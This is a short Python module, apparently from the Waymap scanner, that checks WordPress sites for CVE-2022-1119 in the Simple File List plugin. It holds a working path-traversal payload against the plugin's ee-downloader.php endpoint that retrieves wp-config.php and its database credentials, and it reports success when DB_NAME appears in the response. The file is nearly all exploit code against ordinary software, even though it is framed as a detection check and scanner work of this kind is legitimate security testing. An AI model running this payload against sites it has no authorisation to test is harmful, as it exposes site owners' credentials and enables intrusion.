# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-1119 - WordPress Simple File List Plugin Vulnerability

import requests
from urllib.parse import urlparse
from colorama import init, Fore, Style

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_wp_config_accessibility(profile_url):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking for the accessibility of 'wp-config.php' through the vulnerable plugin endpoint...")
    payload = "/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=../../../wp-config.php"
    
    try:
        response = requests.get(f'{profile_url}{payload}', 
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 200 and "DB_NAME" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable! 'wp-config.php' is accessible through the plugin.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] 'wp-config.php' is not accessible. The Target may not be vulnerable.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error accessing 'wp-config.php': {e}")
        return False

def scan_cve_2022_1119(profile_url):

    if check_wp_config_accessibility(profile_url):
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Target is vulnerable to CVE-2022-1119!")
        return True
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Target does not seem to be vulnerable to CVE-2022-1119.")
        return

